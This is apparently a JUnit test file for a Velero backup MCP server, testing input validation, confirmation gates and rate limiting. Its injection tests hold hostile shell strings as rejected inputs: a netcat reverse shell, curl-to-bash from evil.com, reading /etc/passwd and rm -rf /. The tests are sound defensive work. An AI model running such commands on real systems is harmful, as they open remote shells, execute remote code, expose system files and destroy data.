package com.ecoskiller.mcp.velero;

import com.ecoskiller.mcp.velero.security.SecurityManager;
import com.ecoskiller.mcp.velero.tools.*;
import com.ecoskiller.mcp.velero.model.ToolResult;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.*;

import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Unit tests for all 16 EcoSkiller Velero MCP agents.
 *
 * Run: mvn test
 * Run (verbose): mvn test -Dtest=VeleroMcpTest
 *
 * Tests cover:
 *   - Security validation (injection attempts, bad names, invalid namespaces)
 *   - Parameter validation (TTL, cron, bucket names, URLs)
 *   - Safety gates (confirm=false, full-cluster restore, primary schedule delete)
 *   - Rate-limiting for destructive operations
 *   - Tool schema presence (all tools expose inputSchema)
 */
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
class VeleroMcpTest {

    private static final ObjectMapper MAPPER   = new ObjectMapper();
    private static SecurityManager    security;

    @BeforeAll
    static void setup() {
        security = new SecurityManager();
    }

    // ════════════════════════════════════════════════════════════════════════
    // SecurityManager unit tests
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(1)
    @DisplayName("SEC-01: Valid backup names pass validation")
    void testValidNames() {
        assertDoesNotThrow(() -> security.validateName("ecoskiller-daily"));
        assertDoesNotThrow(() -> security.validateName("pre-migration-2026-03-20"));
        assertDoesNotThrow(() -> security.validateName("backup_001"));
        assertDoesNotThrow(() -> security.validateName("A1"));
    }

    @Test @Order(2)
    @DisplayName("SEC-02: Shell injection in name is rejected")
    void testInjectionInName() {
        assertThrows(SecurityException.class, () -> security.validateName("backup; rm -rf /"));
        assertThrows(SecurityException.class, () -> security.validateName("backup$(curl evil.com)"));
        assertThrows(SecurityException.class, () -> security.validateName("backup`whoami`"));
        assertThrows(SecurityException.class, () -> security.validateName("backup|cat /etc/passwd"));
        assertThrows(SecurityException.class, () -> security.validateName("backup&nc -e /bin/sh 1.2.3.4"));
    }

    @Test @Order(3)
    @DisplayName("SEC-03: Path traversal in name is rejected")
    void testPathTraversal() {
        assertThrows(SecurityException.class, () -> security.validateName("../../etc/passwd"));
        assertThrows(SecurityException.class, () -> security.validateName("backup/../secret"));
    }

    @Test @Order(4)
    @DisplayName("SEC-04: Allowed namespaces pass validation")
    void testValidNamespaces() {
        for (String ns : SecurityManager.ALLOWED_NAMESPACES) {
            assertDoesNotThrow(() -> security.validateNamespace(ns),
                "Namespace '" + ns + "' should be allowed");
        }
    }

    @Test @Order(5)
    @DisplayName("SEC-05: Unknown namespaces are rejected")
    void testInvalidNamespaces() {
        assertThrows(SecurityException.class, () -> security.validateNamespace("kube-system"));
        assertThrows(SecurityException.class, () -> security.validateNamespace("default"));
        assertThrows(SecurityException.class, () -> security.validateNamespace("production"));
        assertThrows(SecurityException.class, () -> security.validateNamespace("../admin"));
    }

    @Test @Order(6)
    @DisplayName("SEC-06: Valid TTL formats pass")
    void testValidTtl() {
        assertDoesNotThrow(() -> security.validateTtl("168h"));
        assertDoesNotThrow(() -> security.validateTtl("720h"));
        assertDoesNotThrow(() -> security.validateTtl("30m"));
        assertDoesNotThrow(() -> security.validateTtl("3600s"));
    }

    @Test @Order(7)
    @DisplayName("SEC-07: Invalid TTL formats are rejected")
    void testInvalidTtl() {
        assertThrows(SecurityException.class, () -> security.validateTtl("7d"));       // days not supported
        assertThrows(SecurityException.class, () -> security.validateTtl("168hours"));
        assertThrows(SecurityException.class, () -> security.validateTtl("$(id)"));
        assertThrows(SecurityException.class, () -> security.validateTtl(""));
    }

    @Test @Order(8)
    @DisplayName("SEC-08: Valid cron expressions pass")
    void testValidCron() {
        assertDoesNotThrow(() -> security.validateCron("0 2 * * *"));
        assertDoesNotThrow(() -> security.validateCron("0 * * * *"));
        assertDoesNotThrow(() -> security.validateCron("*/15 * * * *"));
    }

    @Test @Order(9)
    @DisplayName("SEC-09: Cron injection is rejected")
    void testInvalidCron() {
        assertThrows(SecurityException.class, () -> security.validateCron("0 2 * * *; rm -rf /"));
        assertThrows(SecurityException.class, () -> security.validateCron("$(curl evil.com)"));
        assertThrows(SecurityException.class, () -> security.validateCron(""));
    }

    @Test @Order(10)
    @DisplayName("SEC-10: Valid URLs pass")
    void testValidUrls() {
        assertDoesNotThrow(() -> security.validateUrl("https://minio.ops.svc.cluster.local:9000"));
        assertDoesNotThrow(() -> security.validateUrl("http://minio-internal:9000"));
    }

    @Test @Order(11)
    @DisplayName("SEC-11: Malformed URLs are rejected")
    void testInvalidUrls() {
        assertThrows(SecurityException.class, () -> security.validateUrl("javascript:alert(1)"));
        assertThrows(SecurityException.class, () -> security.validateUrl("ftp://badproto.com"));
        assertThrows(SecurityException.class, () -> security.validateUrl(""));
    }

    @Test @Order(12)
    @DisplayName("SEC-12: Free-text sanitisation strips shell metacharacters")
    void testFreeTextSanitise() {
        String result = security.sanitiseFreeText("notes; rm -rf /");
        assertFalse(result.contains(";"));
        assertFalse(result.contains("|"));

        String truncated = security.sanitiseFreeText("a".repeat(600));
        assertTrue(truncated.length() <= 500, "Should truncate at 500 chars");
    }

    @Test @Order(13)
    @DisplayName("SEC-13: Rate-limiting blocks rapid destructive calls")
    void testRateLimiting() {
        security.checkDestructiveRateLimit("test-op-unique-key-1");
        assertThrows(SecurityException.class,
            () -> security.checkDestructiveRateLimit("test-op-unique-key-1"),
            "Second immediate call should be rate-limited");
    }

    @Test @Order(14)
    @DisplayName("SEC-14: Rate-limiting allows different operation keys concurrently")
    void testRateLimitingDifferentKeys() {
        assertDoesNotThrow(() -> security.checkDestructiveRateLimit("op-key-A"));
        assertDoesNotThrow(() -> security.checkDestructiveRateLimit("op-key-B"),
            "Different operation keys should not interfere");
    }

    // ════════════════════════════════════════════════════════════════════════
    // Tool schema tests — every tool must expose a valid inputSchema
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(20)
    @DisplayName("SCHEMA-01: All 16 tools expose non-null inputSchema")
    void testAllToolsHaveSchema() {
        BaseTool[] tools = allTools();
        assertEquals(16, tools.length, "Expected exactly 16 tools");
        for (BaseTool tool : tools) {
            assertNotNull(tool.getInputSchema(),
                tool.getName() + " has null inputSchema");
            assertNotNull(tool.getInputSchema().get("type"),
                tool.getName() + " schema missing 'type'");
            assertNotNull(tool.getInputSchema().get("properties"),
                tool.getName() + " schema missing 'properties'");
        }
    }

    @Test @Order(21)
    @DisplayName("SCHEMA-02: All 16 tools have non-blank names and descriptions")
    void testAllToolsHaveNames() {
        for (BaseTool tool : allTools()) {
            assertFalse(tool.getName().isBlank(),       tool.getClass().getSimpleName() + " has blank name");
            assertFalse(tool.getDescription().isBlank(), tool.getClass().getSimpleName() + " has blank description");
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    // Safety gate tests (no real Velero CLI needed — safety checked before CLI)
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(30)
    @DisplayName("SAFETY-01: backup_delete requires confirm=true")
    void testBackupDeleteRequiresConfirm() {
        BackupDeleteTool tool = new BackupDeleteTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("backup_name", "test-backup");
        args.put("confirm", false);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError(), "Should fail without confirm=true");
        assertTrue(result.getText().contains("confirm must be set to true"));
    }

    @Test @Order(31)
    @DisplayName("SAFETY-02: restore_create full-cluster requires confirm=true")
    void testRestoreFullClusterRequiresConfirm() {
        RestoreCreateTool tool = new RestoreCreateTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("backup_name", "ecoskiller-daily-20260320");
        args.put("confirm", false);
        // No include_namespaces → full cluster restore
        ToolResult result = tool.execute(args);
        assertTrue(result.isError(), "Full cluster restore without confirm should fail");
        assertTrue(result.getText().contains("FULL CLUSTER RESTORE requires confirm=true"));
    }

    @Test @Order(32)
    @DisplayName("SAFETY-03: schedule_delete refuses to delete ecoskiller-daily without override_primary")
    void testScheduleDeletePrimaryProtected() {
        ScheduleDeleteTool tool = new ScheduleDeleteTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("schedule_name", "ecoskiller-daily");
        args.put("confirm", true);
        args.put("override_primary", false);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError(), "Deleting primary schedule without override should fail");
        assertTrue(result.getText().contains("PROTECTED"));
    }

    @Test @Order(33)
    @DisplayName("SAFETY-04: schedule_delete refuses without confirm")
    void testScheduleDeleteRequiresConfirm() {
        ScheduleDeleteTool tool = new ScheduleDeleteTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("schedule_name", "some-other-schedule");
        args.put("confirm", false);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("confirm must be true"));
    }

    @Test @Order(34)
    @DisplayName("SAFETY-05: backup_storage_location switch_to_dr requires confirm")
    void testBslSwitchRequiresConfirm() {
        BackupStorageLocationTool tool = new BackupStorageLocationTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action", "switch_to_dr");
        args.put("confirm", false);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("confirm must be true"));
    }

    @Test @Order(35)
    @DisplayName("SAFETY-06: backup_storage_location unknown action returns error")
    void testBslUnknownAction() {
        BackupStorageLocationTool tool = new BackupStorageLocationTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action", "destroy_everything");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
    }

    // ════════════════════════════════════════════════════════════════════════
    // Security injection in tool args
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(40)
    @DisplayName("INJECT-01: Shell injection in backup_name is blocked")
    void testInjectionInBackupCreate() {
        BackupCreateTool tool = new BackupCreateTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("backup_name", "backup; curl http://evil.com | bash");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation"));
    }

    @Test @Order(41)
    @DisplayName("INJECT-02: Invalid namespace in backup_create is blocked")
    void testInvalidNamespaceInBackupCreate() {
        BackupCreateTool tool = new BackupCreateTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("backup_name", "valid-backup");
        args.put("include_namespaces", "kube-system,default");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation") || result.getText().contains("allow-list"));
    }

    @Test @Order(42)
    @DisplayName("INJECT-03: Invalid TTL in backup_create is blocked")
    void testInvalidTtlInBackupCreate() {
        BackupCreateTool tool = new BackupCreateTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("backup_name", "valid-backup");
        args.put("ttl", "7days$(evil)");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
    }

    @Test @Order(43)
    @DisplayName("INJECT-04: Injection in restore_name is blocked")
    void testInjectionInRestoreName() {
        RestoreCreateTool tool = new RestoreCreateTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("backup_name", "valid-backup");
        args.put("restore_name", "restore`id`");
        args.put("include_namespaces", "core");
        args.put("confirm", true);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
    }

    @Test @Order(44)
    @DisplayName("INJECT-05: Injection in schedule_name is blocked")
    void testInjectionInScheduleName() {
        ScheduleCreateTool tool = new ScheduleCreateTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("schedule_name", "daily && curl evil.com");
        args.put("cron", "0 2 * * *");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
    }

    // ════════════════════════════════════════════════════════════════════════
    // DR drill log tool — validates without real Velero
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(50)
    @DisplayName("DR-01: dr_drill_log rejects invalid drill_type")
    void testDrDrillLogInvalidType() {
        DrDrillLogTool tool = new DrDrillLogTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("drill_type",    "nuclear_option");
        args.put("restore_name", "restore-001");
        args.put("backup_name",  "backup-001");
        args.put("start_time",   "2026-03-20T02:00:00Z");
        args.put("end_time",     "2026-03-20T02:45:00Z");
        args.put("outcome",      "passed");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Invalid drill_type"));
    }

    @Test @Order(51)
    @DisplayName("DR-02: dr_drill_log rejects invalid outcome")
    void testDrDrillLogInvalidOutcome() {
        DrDrillLogTool tool = new DrDrillLogTool(security);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("drill_type",   "full_cluster");
        args.put("restore_name", "restore-001");
        args.put("backup_name",  "backup-001");
        args.put("start_time",   "2026-03-20T02:00:00Z");
        args.put("end_time",     "2026-03-20T02:45:00Z");
        args.put("outcome",      "kinda_worked");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Invalid outcome"));
    }

    // ════════════════════════════════════════════════════════════════════════
    // Helpers
    // ════════════════════════════════════════════════════════════════════════

    private BaseTool[] allTools() {
        return new BaseTool[]{
            new BackupCreateTool(security),
            new BackupListTool(security),
            new BackupDeleteTool(security),
            new BackupStatusTool(security),
            new BackupDescribeTool(security),
            new RestoreCreateTool(security),
            new RestoreListTool(security),
            new RestoreStatusTool(security),
            new RestoreDescribeTool(security),
            new ScheduleListTool(security),
            new ScheduleCreateTool(security),
            new ScheduleDeleteTool(security),
            new BackupStorageLocationTool(security),
            new BackupIntegrityCheckTool(security),
            new DrDrillLogTool(security),
            new ClusterHealthTool(security)
        };
    }
}
